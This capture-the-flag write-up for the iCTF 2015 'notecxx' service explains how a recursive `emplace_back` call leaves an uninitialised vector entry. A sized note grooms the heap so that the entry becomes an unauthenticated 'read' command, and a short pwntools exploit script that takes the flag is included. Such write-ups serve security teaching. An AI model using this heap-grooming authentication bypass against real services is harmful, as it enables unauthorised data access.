# notecxx

*(iCTF 2015, DCIETS)*

This challenge allowed users to write notes and issue commands intended to load/save
notes. However, issuing a "read" command from the command-line interface would actually
issue an "authenticate" command in addition to the "read" command. The authentication
command would check a 64-bit integer against the contents of a passcode file, and cause
the program to exit if it did not match.

	if (str == "read")
	{
		uint64_t passcode;
		cin >> passcode;
		commands.emplace_back(authenticate_tag(), passcode);
		commands.emplace_back(read_file_tag());
	}
	
	/* snip */
	
	if (opcode == authenticate)
	{
		char buffer[] = "18446744073709551616";
		safe_fd("passcode", O_RDONLY).read(buffer);
		uint64_t code = strtoull(buffer, nullptr, 0);
		if (code != llu)
		{
			// hackers
			exit(0xdead);
		}
	}

It is, however, possible to issue a single "read" command without the "authentication"
command. The solution exploits an edge case in `std::vector<T>::emplace_back`. While the
standard [does not explicitly forbid it (yet), `emplace_back` shouldn't modify the
collection that it's being called on][1]. This is however what happens in the
`command::command(print_tag, const string&)` constructor.

	command::command(print_tag, const std::string& message) : command(print)
	{
		auto max_size = string_size - 1;
		strncpy(char_storage(), message.c_str(), max_size);
		if (message.size() > max_size)
		{
			commands.emplace_back(print_tag(), message.substr(max_size)); // <--
		}
	}
	
	/* snip */
	
	if (str == "echo")
	{
		getline(cin, str);
		// trim spaces at beginning and end of string
		str.erase(str.begin(), str.begin() + str.find_first_not_of(whitespace));
		str.erase(str.begin() + str.find_last_not_of(whitespace) + 1, str.end());
		str.push_back('\n');
		commands.emplace_back(print_tag(), str); // <--
	}

To offer exception safety, the size of a `vector` is only modified after the new
item has been fully constructed by `emplace_back`. When `emplace_back` is called
recursively, both calls will therefore attempt to construct an item at the same location
(since the size is only incremented *after* the constructor completes), but the container
size will still be increased by 2. The second item therefore is uninitialized, and has the
value of whatever happened to be there before. This means that if you sent an echo command
with a string between 15 and 28 characters, you'd end up with *only one* echo command in
the `commands` vector (containing the second half of the parameter), and an additional,
uninitialized item.

Libstdc++'s allocator is rather predictable. On the version that ships with Ubuntu 14.04
(which depends on glibc's malloc), `commands.reserve(4)` will reuse the same memory chunk
that a previous allocation of a similar size used. The only allocation that this program
performs prior to `commands.reserve` is the one where the `input_buffer` variable is used
to construct the `std::string` passed to `analyze_string`.

In other words, if you passed a note with the right size, whatever data you had in the
note would be present as uninitialized memory in the `commands` vector. There is some
OS-specific tweaking here, but we found that the eighth character of a 34-byte allocation
(not that it's the only size that would work, mind you) would **reliably** be aligned with
the type byte of the third command. Therefore, if that byte happened to be 53 (ASCII
character "5"), the item would be interpreted as a read command.

You could exploit our service with this tiny script:

	import random
	from pwn import *

	def exploit(host, port, flag_id):
		char_array = ["a"] * 34
		char_array[8] = "5"
	
		p = remote(host, port)
		p.sendline("".join(char_array))
		p.sendline("cd %s" % flag_id)
		p.sendline("echo %s" % ("a" * 15))
		p.shutdown()
	
		p.recvuntil("FLG")
		return "FLG" + p.recvline().strip()

  [1]: https://llvm.org/bugs/show_bug.cgi?id=16238